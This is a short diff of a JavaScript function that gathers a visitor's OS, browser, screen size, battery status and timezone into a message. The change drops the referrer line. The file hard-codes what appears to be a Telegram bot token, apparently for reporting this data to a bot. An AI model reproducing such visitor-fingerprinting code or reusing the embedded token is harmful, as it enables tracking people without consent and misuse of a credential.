@@ -59,8 +59,7 @@ async function getUserInfo(action) {
             `🖥️ OS: ${os}\n` +
             `🌍 Browser: ${browser}\n` +
             `🖥️ Screen Resolution: ${screenWidth}x${screenHeight}\n` +
-            `🔋 Battery: ${batteryLevel}% (${chargingStatus})\n` +
-            `🌐 Referring Website: ${referrer}\n` +
+            `🔋 Battery: ${batteryLevel}% (${chargingStatus})\n`  +
             `⌛ Timezone: ${timezone}\n`;
 
         let mainBotToken = "7734214657:AAH7BTiw8WOHv0tztVZ2dNW-Qkhke8n94rs";
